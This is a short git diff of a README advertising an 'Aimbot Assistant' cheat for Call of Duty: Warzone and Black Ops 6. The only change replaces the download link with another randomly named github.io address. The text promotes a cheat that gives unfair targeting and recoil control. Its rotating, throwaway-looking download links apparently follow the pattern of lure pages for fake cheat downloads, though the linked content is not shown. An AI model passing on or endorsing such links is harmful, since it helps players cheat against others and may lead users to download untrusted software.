@@ -3,7 +3,7 @@
 Set up the **Aimbot Assistant** for Call of Duty: Warzone and Black Ops 6 on Windows. This step-by-step guide helps you configure advanced targeting, manage recoil patterns, and customize profiles for different weapons to maximize your in-game accuracy.
 
 ⬇️ **Download**  
-[![Download Aim Assistant](https://img.shields.io/badge/Download-Aim_Assistant-000000?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://codbo6aimnbot90web.github.io/.github/)
+[![Download Aim Assistant](https://img.shields.io/badge/Download-Aim_Assistant-000000?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://1codwarzone1bo6aim0.github.io/.github/)
 
 ---
 
